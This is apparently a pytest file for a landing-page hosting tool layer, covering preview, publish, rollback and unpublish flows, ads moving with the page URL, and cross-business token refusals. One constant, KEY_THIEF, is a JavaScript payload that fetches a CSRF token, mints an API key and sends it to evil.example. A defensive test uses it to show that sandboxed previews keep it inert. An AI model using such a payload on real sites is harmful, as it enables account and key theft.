"""agent/tools_hosting.py: preview_page, publish_page and unpublish_page (A3p-2 Task 3), and get_page's own
versions/hostname/source (agent/tools_pages.py) -- through the tool layer (call_tool), as test_tools_pages.py
does. The post-publish check's own network fetch runs for real against a MockTransport keyed to the hosted
URL and answered from the database, so it proves the tool's actual sanitise-then-inject pipeline rather than
a stubbed report.

Two business fixtures: `_hosted_biz` (the "dental walk" through a real consultation, test_landing.py's
`_plan` -- a full plan `landing.kit()` can actually build from, needed by every test that reaches
confirm_proposal's after-commit check) and `seed` (test_ads_run.py's lighter, ads_launch-oriented plan --
enough for precheck_publish_page's own "a plan exists" check and for the ads-launch machinery the
URL-following test needs, but not for a real kit)."""

from __future__ import annotations

import httpx
import pytest
from fastapi.testclient import TestClient
from fastmcp.exceptions import ToolError

from agent import (
    ads_run,
    auth,
    business,
    config,
    crawl,
    hosted,
    keys,
    landing,
    mail,
    page_builder,
    proposals,
    tools_hosting,
    track,
)
from agent.sites import intake
from agent.tests.conftest import ACCOUNT_JARGON, JARGON, MONEY_JARGON, call_tool, data, tool_text
from agent.tests.fixtures import business_with_key, page_copy_fixture
from agent.tests.test_ads_run import (  # noqa: F401 (fixtures)
    BIZ,
    CHECK_OK,
    GOOGLE,
    KNOWLEDGE,
    PAGE_URL,
    gads,
    launched,
    live,
    queued,
    row,
    sections,
    seed,
)
from agent.tests.test_landing import _plan, fake  # noqa: F401 (fixture)

DOMAIN = "business.test"
HOSTNAME = "bright-smile-dental.business.test"  # knowledge_fixture()'s name + website (plans.name_for)
URL = f"https://{HOSTNAME}/"
PUBLIC_IP = ["93.184.216.34"]  # RFC 5737 documentation range: never a real, reachable address

GOOD_HTML = (
    '<html><head><meta charset="utf-8">'
    '<meta name="viewport" content="width=device-width, initial-scale=1"></head><body>'
    "<h1>Invisalign in Palo Alto</h1>"
    "<p>Same-week appointments across the Peninsula for adults and teens who want a straighter smile "
    "without metal braces. Our dentists have helped thousands of patients feel confident again, and we "
    "would love to help you next. Book a free consultation today and find out whether Invisalign is "
    "right for you. Most patients start treatment within a week of their first visit, and our friendly "
    "team is here to answer every question along the way, from cost to how long treatment usually takes.</p>"
    '<p>Call <a href="tel:+16505550100">(650) 555-0100</a> to book, or use the form below to request a callback.</p>'
    "</body></html>"
)
GOOD_HTML_V2 = GOOD_HTML.replace("request a callback.", "request a callback, any day of the week.")
BAD_HTML = "<html><body><p>Too short.</p></body></html>"


def _hosted_biz(client, conn, monkeypatch, fake) -> tuple[str, str]:  # noqa: F811 (fixture)
    """A verified business with a full, real plan (the dental walk) and hosting turned on; returns
    (key, business_id). Every test whose flow reaches confirm_proposal needs this one, not `seed()`: the
    after-commit check calls landing.kit(), which needs more of a plan than ads_launch/ads_run's own tests do."""
    monkeypatch.setenv("AGENT_PAGES_DOMAIN", DOMAIN)
    key, biz, _plan_id = _plan(client, conn, fake)
    conn.execute("UPDATE business SET owner_email = 'owner@example.com' WHERE id = %s", (biz,))
    return key, biz


def _mailbox(monkeypatch) -> list:
    """The check report e-mail, mocked (test_tools_pages.py's own pattern for mail.client())."""
    monkeypatch.setenv("RESEND_API_KEY", "re_test_SECRET")
    sent: list = []
    monkeypatch.setattr(
        mail,
        "client",
        lambda: httpx.Client(
            transport=httpx.MockTransport(lambda r: (sent.append(r), httpx.Response(200, json={"id": "em_1"}))[1])
        ),
    )
    return sent


def _checked(monkeypatch, conn, url: str) -> None:
    """The post-publish check's own network calls: a resolver that reads the pages-test domain as public
    (RFC 2606 reserved TLDs never resolve for real, the same reason test_tools_pages.py patches crawl.resolve
    for set_landing_page), and a transport that answers `url` with whatever `page.html` actually is right
    now -- the real, injected content apply_publish_page just committed, not a value predicted in advance."""
    monkeypatch.setattr(crawl, "resolve", lambda h: PUBLIC_IP)

    def handler(request: httpx.Request) -> httpx.Response:
        if str(request.url) == url:
            found = conn.execute("SELECT html FROM page WHERE url = %s", (url,)).fetchone()
            if found and found["html"]:
                return httpx.Response(200, text=found["html"])
        return httpx.Response(404, text="not found")

    monkeypatch.setattr(tools_hosting, "_check_transport", lambda: httpx.MockTransport(handler))


def _publish(client, conn, monkeypatch, key: str, html: str, idem: str) -> dict:
    """preview_page -> publish_page(token) -> confirm_proposal, asserting nothing failed along the way;
    returns confirm_proposal's own data."""
    prev = data(call_tool(client, "preview_page", {"html": html}, key=key))
    assert prev["problems"] == [], prev
    prop = data(call_tool(client, "publish_page", {"idempotency_key": f"pp{idem}", "token": prev["token"]}, key=key))
    assert prop["status"] == "proposed", prop
    _checked(monkeypatch, conn, URL)
    res = call_tool(
        client, "confirm_proposal", {"proposal_id": prop["proposal_id"], "idempotency_key": f"c{idem}"}, key=key
    )
    assert not res["isError"], tool_text(res)
    return data(res)


def _kit_ready_sections(**kwargs) -> dict:
    """test_ads_run.sections()'s own shape, extended with the fields plans.cards()/landing.kit() need (later,
    conversions, duration_days) that ads_launch/ads_run's own tests never touch. H22 review minor: without
    these, the after-commit hook's landing.kit() call always raises, so a test built on the plain seed()/
    launched() plan can only ever prove the URL moves *despite* the check having failed, never the normal
    path (a real check saved, ads moved because of it)."""
    secs = sections(**kwargs)
    secs["consultation"]["later"] = []
    secs["consultation"]["conversions"] = "a call or a booking"
    secs["consultation"]["duration_days"] = 30
    return secs


def _launched_with_kit(conn, gads) -> tuple[str, str]:  # noqa: F811 (fixture-shaped helper, mirrors launched())
    """launched()'s own steps (test_ads_run.py), with a plan shape landing.kit() can also build from."""
    key, v1 = seed(conn, secs=_kit_ready_sections())
    queued(conn, v1)
    out = ads_run.launch(conn, config.load(), BIZ, GOOGLE)
    assert out["state"] == "live", out
    return key, v1


# ---------------------------------------------------------------- preview_page (no plan needed at all)


def test_preview_page_returns_a_token_and_a_url_on_the_agent_host(client, conn, monkeypatch):
    key, _plan_id = seed(conn, link=None, page=False, conversions=False)

    res = call_tool(client, "preview_page", {"html": GOOD_HTML, "title": "Bright Smile Dental"}, key=key)

    assert not res["isError"], tool_text(res)
    env = data(res)
    assert env["problems"] == []
    assert env["token"].startswith("pv_")
    assert env["preview_url"] == f"http://testserver/p/{env['token']}"
    assert env["expires_at"]
    assert env["preview_url"] in res["structuredContent"]["say"]
    # the raw html is stored as given: no injection at preview time (H8: Admiry's snippet is added on publish)
    prev_row = hosted.preview(conn, env["token"])
    assert prev_row["html"] == GOOD_HTML


def test_preview_page_with_a_bad_page_lists_the_problems_and_has_no_token(client, conn, monkeypatch):
    key, _plan_id = seed(conn, link=None, page=False, conversions=False)

    res = call_tool(client, "preview_page", {"html": BAD_HTML}, key=key)

    assert not res["isError"], tool_text(res)
    env = data(res)
    assert "token" not in env and "preview_url" not in env and "expires_at" not in env
    assert len(env["problems"]) == 1 and "more real text" in env["problems"][0]
    assert env["problems"][0] in res["structuredContent"]["say"]


def test_preview_page_works_even_when_hosting_is_off(client, conn, monkeypatch):
    """H1: preview_page lives on the agent host and needs no pages domain at all."""
    monkeypatch.delenv("AGENT_PAGES_DOMAIN", raising=False)
    key, _plan_id = seed(conn, link=None, page=False, conversions=False)

    res = call_tool(client, "preview_page", {"html": GOOD_HTML}, key=key)

    assert not res["isError"], tool_text(res)
    assert data(res)["problems"] == []


# The final review's F1/F4: every same-origin step of minting a key as whoever opens the page -- and no `location`,
# no `open(`, no on* attribute, so every sanitiser rule passes it.
KEY_THIEF = (
    "<script>(async () => {"
    "const c = await (await fetch('/api/csrf')).json();"
    "const k = await (await fetch('/connect/keys', {method: 'POST', body: new URLSearchParams({csrf: c.csrf})}))"
    ".text();"
    "new Image().src = 'https://evil.example/c?k=' + encodeURIComponent(k);"
    "})();</script>"
)


def test_a_previews_own_script_never_runs_where_the_owners_cookie_is(conn, monkeypatch):
    """H42 (the final review's F1/F4): anyone with a manage key can preview a page whose script, opened by a
    signed-in owner, would mint a key as that owner. On the prod host split (MCP and previews on the agent host,
    browser pages and their cookies on the web host) the browser host answers the token 404, so the script never
    runs where the owner's session cookie is; on the agent host it is served sandboxed in an opaque origin whose
    fetches may reach only the public /t/ endpoints (H45) -- never /api/csrf or /connect/keys, the steps it needs --
    and no cookie goes with anything it can still send (a form post, an image, a /t/ fetch)."""
    monkeypatch.setenv("AGENT_PUBLIC_BASE_URL", "https://agent.admiry.ai")
    monkeypatch.setenv("AGENT_WEB_BASE_URL", "https://admiry.ai")
    from agent.app import create_app

    key = business_with_key(conn, biz_id="biz_attacker", scopes=("read", "manage"))
    with TestClient(create_app(), base_url="https://agent.admiry.ai") as c:
        thief = GOOD_HTML.replace("</body>", KEY_THIEF + "</body>")
        made = data(call_tool(c, "preview_page", {"html": thief}, key=key))
        assert made["problems"] == [] and made["preview_url"] == f"https://agent.admiry.ai/p/{made['token']}"

        on_web = c.get(f"https://admiry.ai/p/{made['token']}")
        on_agent = c.get(made["preview_url"])

    assert on_web.status_code == 404 and "fetch(" not in on_web.text
    assert on_agent.status_code == 200 and "fetch('/connect/keys'" in on_agent.text  # served as written, but inert:
    policy = dict(p.strip().split(" ", 1) for p in on_agent.headers["content-security-policy"].split(";"))
    assert policy["sandbox"] == "allow-scripts allow-forms"  # an opaque origin: no cookie, no same-origin read
    # one path-scoped source (a prefix, CSP3's path match): the thief's own fetches fall outside it
    assert policy["connect-src"] == "https://agent.admiry.ai/t/"
    for step in ("https://agent.admiry.ai/api/csrf", "https://agent.admiry.ai/connect/keys"):
        assert not step.startswith(policy["connect-src"]), step
    assert "set-cookie" not in on_agent.headers


# ---------------------------------------------------------------- publish_page: refusals needing no full kit


def test_publish_page_refuses_when_hosting_is_off(client, conn, monkeypatch):
    monkeypatch.delenv("AGENT_PAGES_DOMAIN", raising=False)
    key, _plan_id = seed(conn, link=None, page=False, conversions=False)

    res = call_tool(client, "publish_page", {"idempotency_key": "p1", "token": "pv_nope"}, key=key)

    assert res["isError"] and tool_text(res) == "Hosting is not set up on this server"


def test_publish_page_refuses_both_token_and_version_or_neither(client, conn, monkeypatch):
    monkeypatch.setenv("AGENT_PAGES_DOMAIN", DOMAIN)
    key, _plan_id = seed(conn, link=None, page=False, conversions=False)

    neither = call_tool(client, "publish_page", {"idempotency_key": "p1"}, key=key)
    both = call_tool(client, "publish_page", {"idempotency_key": "p2", "token": "pv_x", "version": 1}, key=key)

    for res in (neither, both):
        assert res["isError"] and "Give either token or version" in tool_text(res)


def test_publish_page_refuses_an_unknown_or_expired_token(client, conn, monkeypatch):
    monkeypatch.setenv("AGENT_PAGES_DOMAIN", DOMAIN)
    key, _plan_id = seed(conn, link=None, page=False, conversions=False)

    res = call_tool(client, "publish_page", {"idempotency_key": "p1", "token": "pv_nope"}, key=key)

    assert res["isError"] and "expired or is unknown" in tool_text(res)


def test_publish_page_refuses_a_version_when_there_is_no_page_at_all(client, conn, monkeypatch):
    """Minor 5 / H25 (round 2): the wording now says what to do next, and names Admiry's own hosting -- an
    owner's own page (set_landing_page) is a page too, just not one publish_page(version=) can roll back."""
    monkeypatch.setenv("AGENT_PAGES_DOMAIN", DOMAIN)
    key, _plan_id = seed(conn, link=None, page=False, conversions=False)

    res = call_tool(client, "publish_page", {"idempotency_key": "p1", "version": 1}, key=key)

    assert res["isError"] and "no Admiry-hosted page yet; make a preview first" in tool_text(res)


def test_publish_page_refuses_a_version_that_does_not_exist(client, conn, monkeypatch):
    """H25 (round 2): the version lookup is simply the business's one page row (`landing.current`), whatever
    its `source` -- round 1 filtered it to `source IN ('hosted', 'admiry')`, which no longer exists as a
    distinct case once a business has only ever one row -- so even ensure_page_for_kit's bare owner-source
    placeholder (R8: the same is true of a real owner page) is enough to exercise "no version N" rather than
    "no page yet"; nothing here needs to be hosted first."""
    monkeypatch.setenv("AGENT_PAGES_DOMAIN", DOMAIN)
    key, _plan_id = seed(conn, link=None, page=False, conversions=False)
    landing.ensure_page_for_kit(conn, "biz_1")

    res = call_tool(client, "publish_page", {"idempotency_key": "p1", "version": 99}, key=key)

    assert res["isError"] and "no version 99" in tool_text(res)


# ---------------------------------------------------------------- publish_page: the full confirm flow


def test_publish_page_by_token_confirms_into_a_published_hosted_page(client, conn, monkeypatch, fake):  # noqa: F811
    key, biz = _hosted_biz(client, conn, monkeypatch, fake)
    sent = _mailbox(monkeypatch)

    out = _publish(client, conn, monkeypatch, key, GOOD_HTML, "1")

    assert out["page"]["status"] == "published"
    assert out["page"]["hostname"] == HOSTNAME
    assert out["page"]["url"] == URL
    assert out["page"]["source"] == "hosted"
    assert out["page"]["version"] == 1
    assert out["ads"] == "not built"
    assert out["emailed"] is True and len(sent) == 1
    tracking = next(r for r in out["check"]["rules"] if r["id"] == "tracking")
    assert tracking["ok"] is True  # the snippet apply_publish_page injected is really on the served page

    page = landing.current(conn, biz)
    assert (page["status"], page["hostname"], page["url"], page["source"], page["version"]) == (
        "published",
        HOSTNAME,
        URL,
        "hosted",
        1,
    )
    n = conn.execute("SELECT count(*) AS n FROM page_version WHERE page_id = %s", (page["id"],)).fetchone()["n"]
    assert n == 1
    html = conn.execute("SELECT html FROM page WHERE id = %s", (page["id"],)).fetchone()["html"]
    assert f'data-page="{page["id"]}"' in html and "/t/admiry.js" in html


def test_publish_page_by_version_rolls_back_and_get_page_lists_versions(client, conn, monkeypatch, fake):  # noqa: F811
    key, _biz = _hosted_biz(client, conn, monkeypatch, fake)
    _mailbox(monkeypatch)

    v1 = _publish(client, conn, monkeypatch, key, GOOD_HTML, "1")
    page_id = v1["page"]["id"]
    v1_html = conn.execute("SELECT html FROM page_version WHERE page_id = %s AND version = 1", (page_id,)).fetchone()[
        "html"
    ]
    v2 = _publish(client, conn, monkeypatch, key, GOOD_HTML_V2, "2")
    assert v2["page"]["version"] == 2

    rollback = data(call_tool(client, "publish_page", {"idempotency_key": "p3", "version": 1}, key=key))
    assert "Republish version 1" in rollback["summary"]
    _checked(monkeypatch, conn, URL)
    confirmed = call_tool(
        client, "confirm_proposal", {"proposal_id": rollback["proposal_id"], "idempotency_key": "c3"}, key=key
    )
    assert not confirmed["isError"], tool_text(confirmed)
    v3 = data(confirmed)
    assert v3["page"]["version"] == 3
    v3_html = conn.execute("SELECT html FROM page_version WHERE page_id = %s AND version = 3", (page_id,)).fetchone()[
        "html"
    ]
    assert v3_html == v1_html  # H7: a rollback is a new version whose html equals the old one

    got_res = call_tool(client, "get_page", {}, key=key)
    got = data(got_res)
    versions = got["page"]["versions"]
    assert [v["version"] for v in versions] == [3, 2, 1]
    assert [v["live"] for v in versions] == [True, False, False]
    assert got["page"]["hostname"] == HOSTNAME and got["page"]["source"] == "hosted"
    assert "Admiry-hosted page" in got_res["structuredContent"]["say"]


def test_republish_same_url_reports_unchanged(client, conn, gads, live, monkeypatch):  # noqa: F811 (fixtures)
    """H22 review minor 8: a hosted page already live already answers at its own fixed hostname (H2), so
    publishing a new version of it -- new copy, same address -- is `"unchanged"`, never `"moved"`: nothing
    about the ad's identity (H9) moved, so no diff mutate refreshes it."""
    key, _v1 = launched(conn, gads)
    monkeypatch.setenv("AGENT_PAGES_DOMAIN", DOMAIN)
    _publish(client, conn, monkeypatch, key, GOOD_HTML, "1")
    sent_before = len(gads.sent)

    out = _publish(client, conn, monkeypatch, key, GOOD_HTML_V2, "2")

    assert out["ads"] == "unchanged"
    assert gads.sent[sent_before:] == []  # not even a money mutate: nothing was asked to change


def test_publish_page_reports_off_when_the_ads_switch_is_off(client, conn, gads, live, monkeypatch):  # noqa: F811
    """H22 review minor 8: with the ads switch off, a built campaign is reported "off", not "moved" -- nothing
    is sent, and the say is honest that the old address stays until execution is turned back on, rather than
    silently reading as if nothing were true about the ads right now. H26 (round 2): the reply's classification
    is not what decides the flag -- the address did change, so `url_stale` is queued despite the switch, which
    is what makes that same sentence's promise true once execution comes back on (a resume or the next sweep
    picks it up, H9/`_enable`)."""
    key, _v1 = launched(conn, gads)  # built and enabled while the switch is live
    monkeypatch.setenv("AGENT_ADS_EXECUTION", "off")  # then turned off, for the publish itself
    monkeypatch.setenv("AGENT_PAGES_DOMAIN", DOMAIN)
    sent_before = len(gads.sent)
    prev = data(call_tool(client, "preview_page", {"html": GOOD_HTML}, key=key))
    prop = data(call_tool(client, "publish_page", {"idempotency_key": "pp1", "token": prev["token"]}, key=key))
    _checked(monkeypatch, conn, URL)

    res = call_tool(client, "confirm_proposal", {"proposal_id": prop["proposal_id"], "idempotency_key": "c1"}, key=key)

    assert not res["isError"], tool_text(res)
    out = data(res)
    assert out["ads"] == "off"
    assert len(gads.sent) == sent_before
    assert row(conn)["resources"].get("url_stale") is True  # H26: queued so the move still lands once it is on
    assert "keep their old address until execution is on" in res["structuredContent"]["say"]


# ---------------------------------------------------------------- H9: the ads follow the URL


def test_publishing_a_page_moves_the_live_ads_to_it(client, conn, gads, live, monkeypatch):  # noqa: F811
    """Review Focus 4 (H9): a live ads_campaign built for the owner's own page, then publishing a hosted page
    -- with no plan change at all -- still moves the running ad to the new address right away (launch_now,
    not waiting for the hourly sweep), pausing the old one. The normal path (H22 review minor 10): a plan
    landing.kit() can actually build from (_launched_with_kit, not the plain seed()/launched()), so the
    after-commit check runs for real and is what this test proves alongside the ads moving, not a check
    crashing into the except branch."""
    key, _v1 = _launched_with_kit(conn, gads)
    old_ad_ref = gads.built["ads"]["invisalign palo alto"]
    monkeypatch.setenv("AGENT_PAGES_DOMAIN", DOMAIN)
    sent = _mailbox(monkeypatch)

    out = _publish(client, conn, monkeypatch, key, GOOD_HTML, "1")

    assert out["emailed"] is True and len(sent) == 1  # the check ran for real, not through the except branch
    tracking = next(r for r in out["check"]["rules"] if r["id"] == "tracking")
    assert tracking["ok"] is True
    assert out["ads"] == "moved"
    diff_bodies = gads.bodies("diff")
    assert diff_bodies, f"expected a diff mutate moving the ad; sent kinds were {gads.kinds()}"
    new_url = URL + "?src=gads"
    creates = [
        op["adGroupAdOperation"]["create"]
        for body in diff_bodies
        for op in body["mutateOperations"]
        if op.get("adGroupAdOperation", {}).get("create")
    ]
    assert any(c["ad"]["finalUrls"] == [new_url] for c in creates)
    updates = [
        op["adGroupAdOperation"]["update"]
        for body in diff_bodies
        for op in body["mutateOperations"]
        if op.get("adGroupAdOperation", {}).get("update")
    ]
    assert {"resourceName": old_ad_ref, "status": "PAUSED"} in updates
    r = row(conn)
    assert r["resources"]["final_url"] == new_url and "url_stale" not in r["resources"]
    assert r["state"] == "live"
    page = landing.get(conn, out["page"]["id"])  # minor 5 (round 2): the after-commit check's report is saved
    assert page["check_json"] == out["check"] and page["checked_at"] is not None


# ---------------------------------------------------------------- unpublish_page


def test_unpublish_page_without_ads_answers_gone_and_never_touches_google(client, conn, monkeypatch, fake):  # noqa: F811
    key, _biz = _hosted_biz(client, conn, monkeypatch, fake)
    _mailbox(monkeypatch)
    _publish(client, conn, monkeypatch, key, GOOD_HTML, "1")

    down = data(call_tool(client, "unpublish_page", {"idempotency_key": "u1"}, key=key))
    assert down["status"] == "proposed" and down["kind"] == "unpublish_page"
    confirmed = call_tool(
        client, "confirm_proposal", {"proposal_id": down["proposal_id"], "idempotency_key": "c2"}, key=key
    )

    assert not confirmed["isError"], tool_text(confirmed)
    out = data(confirmed)
    assert out["page"]["status"] == "unpublished" and out["page"]["hostname"] == HOSTNAME
    assert "ads" not in out  # nothing built: the after-commit hook never calls ads_run.pause
    say = confirmed["structuredContent"]["say"]
    assert "gone" in say and "Publishing version 1 again" in say

    resp = hosted.serve(conn, config.load(), HOSTNAME, "/", "GET")
    assert resp.status_code == 410
    assert row(conn) is None or "campaign" not in row(conn)["resources"]  # nothing to pause: no row either way


def test_unpublish_page_refuses_without_a_hosted_page(client, conn, monkeypatch):
    monkeypatch.setenv("AGENT_PAGES_DOMAIN", DOMAIN)
    key, _plan_id = seed(conn, link=None, page=False, conversions=False)

    res = call_tool(client, "unpublish_page", {"idempotency_key": "u1"}, key=key)

    assert res["isError"] and "no published Admiry-hosted page" in tool_text(res)


def test_unpublish_page_pauses_the_ads_when_they_are_built(client, conn, gads, live, monkeypatch):  # noqa: F811
    key, _v1 = launched(conn, gads)
    monkeypatch.setenv("AGENT_PAGES_DOMAIN", DOMAIN)
    _publish(client, conn, monkeypatch, key, GOOD_HTML, "1")
    assert row(conn)["state"] == "live"

    down = data(call_tool(client, "unpublish_page", {"idempotency_key": "u1"}, key=key))
    confirmed = call_tool(
        client, "confirm_proposal", {"proposal_id": down["proposal_id"], "idempotency_key": "c2"}, key=key
    )

    assert not confirmed["isError"], tool_text(confirmed)
    out = data(confirmed)
    assert out["page"]["status"] == "unpublished" and out["ads"] == "paused"
    assert out["ads_by_channel"] == {GOOGLE: "paused"}  # M0 Task 9 D12: per channel, Google mirrored in "ads"
    assert "paused" in confirmed["structuredContent"]["say"].lower()
    r = row(conn)
    assert (r["state"], r["paused_reason"], r["resources"]["paused_by"]) == ("paused", "page_down", "admiry")
    assert gads.kinds().count("pause") == 1


def test_unpublish_page_stacks_its_pause_beside_an_owner_pause(client, conn, gads, live, monkeypatch):  # noqa: F811
    """H24 (A3p-2 Task 3 review), re-specified by M0 Task 9 D5: a row the owner already paused gets Admiry's
    page-down pause beside theirs -- both stand -- so the owner's resume can never put the ads back on a page that
    answers "gone". The proposal still says nothing about pausing (the ads are off already, in the owner's eyes),
    and confirming it sends nothing new to Google at all (the campaign is paused there)."""
    key, _v1 = launched(conn, gads)
    monkeypatch.setenv("AGENT_PAGES_DOMAIN", DOMAIN)
    _publish(client, conn, monkeypatch, key, GOOD_HTML, "1")
    ads_run.pause(conn, config.load(), BIZ, GOOGLE, by="owner")
    sent_before = len(gads.sent)

    down = data(call_tool(client, "unpublish_page", {"idempotency_key": "u1"}, key=key))
    assert down["what_changes"] == [f'https://{HOSTNAME}/ will answer "gone" until you publish again']
    confirmed = call_tool(
        client, "confirm_proposal", {"proposal_id": down["proposal_id"], "idempotency_key": "c2"}, key=key
    )

    assert not confirmed["isError"], tool_text(confirmed)
    out = data(confirmed)
    assert out["page"]["status"] == "unpublished" and out["ads"] == "paused"
    r = row(conn)
    assert (r["state"], r["paused_reason"], r["resources"]["owner_paused"]) == ("paused", "page_down", True)
    assert len(gads.sent) == sent_before  # no Google call at all, not even a re-send of PAUSED
    assert ads_run.status_sentence(r).startswith("Google Search: paused by you and by Admiry today:")

    # the owner's resume lifts their own pause only: the ads stay off while the page is gone
    out = ads_run.resume(conn, config.load(), BIZ, GOOGLE)
    r = row(conn)
    assert (out["state"], r["state"], r["paused_reason"]) == ("paused", "paused", "page_down")
    assert "owner_paused" not in r["resources"] and len(gads.sent) == sent_before


def test_republishing_after_an_admiry_pause_resumes_the_ads(client, conn, gads, live, monkeypatch):  # noqa: F811
    """H24 (A3p-2 Task 3 review): publish_page(version=n) on an unpublished page resumes the ads only when
    Admiry's own pause (from unpublish_page) is what is holding them off."""
    key, _v1 = launched(conn, gads)
    monkeypatch.setenv("AGENT_PAGES_DOMAIN", DOMAIN)
    _publish(client, conn, monkeypatch, key, GOOD_HTML, "1")
    down = data(call_tool(client, "unpublish_page", {"idempotency_key": "u1"}, key=key))
    call_tool(client, "confirm_proposal", {"proposal_id": down["proposal_id"], "idempotency_key": "c2"}, key=key)
    assert row(conn)["state"] == "paused" and row(conn)["paused_reason"] == "page_down"

    rollback = data(call_tool(client, "publish_page", {"idempotency_key": "p2", "version": 1}, key=key))
    _checked(monkeypatch, conn, URL)
    res = call_tool(
        client, "confirm_proposal", {"proposal_id": rollback["proposal_id"], "idempotency_key": "c3"}, key=key
    )

    assert not res["isError"], tool_text(res)
    out = data(res)
    assert out["page"]["status"] == "published" and out["ads"] == "live"
    assert out["ads_by_channel"] == {GOOGLE: "live"}
    r = row(conn)
    assert r["state"] == "live" and "paused_by" not in r["resources"] and r["paused_reason"] is None
    assert hosted.serve(conn, config.load(), HOSTNAME, "/", "GET").status_code == 200


def test_an_owners_pause_landing_during_the_republish_check_stays_the_owners(
    client,
    conn,
    gads,  # noqa: F811 - pytest fixture
    live,  # noqa: F811 - pytest fixture
    monkeypatch,
):
    """The final review's F3: publish_page(version=n) decides inside confirm's transaction that Admiry's own pause
    (unpublish's) ends here, and resumes the ads only after the 14-rule check and the report e-mail -- seconds later.
    An owner's pause landing meanwhile (the Pause button, say) is theirs: the resume lifts Admiry's page-down pause
    alone (M0's two pauses: each is lifted only by its own resume), so the ads stay paused, by the owner."""
    key, _v1 = _launched_with_kit(conn, gads)
    monkeypatch.setenv("AGENT_PAGES_DOMAIN", DOMAIN)
    _publish(client, conn, monkeypatch, key, GOOD_HTML, "1")
    down = data(call_tool(client, "unpublish_page", {"idempotency_key": "u1"}, key=key))
    call_tool(client, "confirm_proposal", {"proposal_id": down["proposal_id"], "idempotency_key": "c2"}, key=key)
    assert row(conn)["paused_reason"] == "page_down"
    rollback = data(call_tool(client, "publish_page", {"idempotency_key": "p2", "version": 1}, key=key))
    _checked(monkeypatch, conn, URL)
    real_check = landing.check

    def checked_while_the_owner_pauses(*args, **kwargs):
        ads_run.pause(conn, config.load(), BIZ, GOOGLE, by="owner")
        return real_check(*args, **kwargs)

    monkeypatch.setattr(landing, "check", checked_while_the_owner_pauses)
    sent = len(gads.sent)

    res = call_tool(
        client, "confirm_proposal", {"proposal_id": rollback["proposal_id"], "idempotency_key": "c3"}, key=key
    )

    assert not res["isError"], tool_text(res)
    assert data(res)["page"]["status"] == "published" and data(res)["ads"] == "paused"
    # the ads' sentence, then (A3p-3) the date the site comes down while the ads are not running at $200 a month
    assert "Google Search: paused by you today." in res["structuredContent"]["say"]
    r = row(conn)
    assert (r["state"], r["resources"]["paused_by"]) == ("paused", "owner") and gads.sent[sent:] == []
    assert r["paused_reason"] is None  # the page is live again: Admiry's own pause is gone, the owner's stands


# ---------------------------------------------------------------- H22: page.hostname is Admiry's hosted one only


def test_publish_page_refuses_a_token_belonging_to_another_business(client, conn, monkeypatch):
    """H22 review: a leaked preview URL must not let another business publish over the first one's page --
    the same "expired or is unknown" sentence a stranger gets for a token that never existed at all."""
    monkeypatch.setenv("AGENT_PAGES_DOMAIN", DOMAIN)
    key_a, _ = seed(conn, biz="biz_a", link=None, page=False, conversions=False)
    key_b, _ = seed(
        conn, biz="biz_b", link=None, page=False, conversions=False, knowledge={**KNOWLEDGE, "name": "Other Biz"}
    )
    tok = data(call_tool(client, "preview_page", {"html": GOOD_HTML}, key=key_a))["token"]

    res = call_tool(client, "publish_page", {"idempotency_key": "pb1", "token": tok}, key=key_b)

    assert res["isError"] and "expired or is unknown" in tool_text(res)
    assert conn.execute("SELECT count(*) AS n FROM page WHERE business_id = 'biz_b'").fetchone()["n"] == 0


def test_precheck_also_refuses_a_token_belonging_to_another_business_at_confirm_time(client, conn, monkeypatch):
    """H22: the same check runs again at confirm time (precheck_publish_page), not just in the tool -- a
    proposal built with a valid token cannot be confirmed by a different business that somehow gets its id."""
    monkeypatch.setenv("AGENT_PAGES_DOMAIN", DOMAIN)
    key_a, _ = seed(conn, biz="biz_a", link=None, page=False, conversions=False)
    seed(conn, biz="biz_b", link=None, page=False, conversions=False, knowledge={**KNOWLEDGE, "name": "Other Biz"})
    tok = data(call_tool(client, "preview_page", {"html": GOOD_HTML}, key=key_a))["token"]
    data(call_tool(client, "publish_page", {"idempotency_key": "pa1", "token": tok}, key=key_a))["proposal_id"]

    with pytest.raises(ToolError, match="expired or is unknown"):
        proposals.precheck_publish_page(conn, "biz_b", {"token": tok, "hostname": HOSTNAME})


def test_owner_url_then_hosted_publish_uses_a_minted_hostname_and_moves_the_ads(client, conn, gads, live, monkeypatch):  # noqa: F811
    """H22 review (probe p7): the owner's own page (set_owner_url) used to leave its host in page.hostname,
    so hostname_for handed that host straight back once the business later went hosted -- the ads moved to a
    made-up address on the owner's own domain, which Admiry never serves. Now the minted slug is Admiry's own."""
    key, v1 = seed(conn, page=False)
    page = landing.set_owner_url(conn, BIZ, PAGE_URL)
    landing.save_check(conn, page["id"], CHECK_OK)
    queued(conn, v1)
    assert ads_run.launch(conn, config.load(), BIZ, GOOGLE)["state"] == "live"
    old_ad_ref = gads.built["ads"]["invisalign palo alto"]
    monkeypatch.setenv("AGENT_PAGES_DOMAIN", DOMAIN)

    out = _publish(client, conn, monkeypatch, key, GOOD_HTML, "1")

    assert out["page"]["hostname"] == HOSTNAME and out["page"]["url"] == URL  # minted, never brightsmile.example
    assert out["ads"] == "moved"
    new_url = URL + "?src=gads"
    diff_bodies = gads.bodies("diff")
    creates = [
        op["adGroupAdOperation"]["create"]
        for body in diff_bodies
        for op in body["mutateOperations"]
        if op.get("adGroupAdOperation", {}).get("create")
    ]
    assert any(c["ad"]["finalUrls"] == [new_url] for c in creates)
    updates = [
        op["adGroupAdOperation"]["update"]
        for body in diff_bodies
        for op in body["mutateOperations"]
        if op.get("adGroupAdOperation", {}).get("update")
    ]
    assert {"resourceName": old_ad_ref, "status": "PAUSED"} in updates
    assert hosted.is_pages_host(HOSTNAME, DOMAIN)


def test_hosted_then_owner_then_rollback_keeps_the_slug(client, conn, monkeypatch, fake):  # noqa: F811
    """H22 review (probe p7b), H25 (round 2, R1/R2): a business that goes hosted, then names its own page, then
    rolls back to the hosted version keeps the same hostname (hostname_for finds it regardless of which row is
    live meanwhile) and the rollback itself works. H25: this is one page row throughout, never re-keyed --
    `set_owner_url` updates it in place whatever its current `source` (round 1 only filtered its own lookup to
    `source = 'owner'`, which minted a *second* row here and then collided with the first on page_hostname_one
    the moment the rollback tried to reuse the same slug) -- so the row count never moves off one, and the
    tracking snippet the assistant pasted at kit time (its id never changes) keeps taking events the whole way
    through, on the owner's own page and back."""
    key, biz = _hosted_biz(client, conn, monkeypatch, fake)
    pasted_id = landing.kit(conn, biz)["page_id"]  # what the assistant's snippet already carries
    _publish(client, conn, monkeypatch, key, GOOD_HTML, "1")
    assert landing.current(conn, biz)["id"] == pasted_id

    owner_page = landing.set_owner_url(conn, biz, "https://brightsmile.example/invisalign")
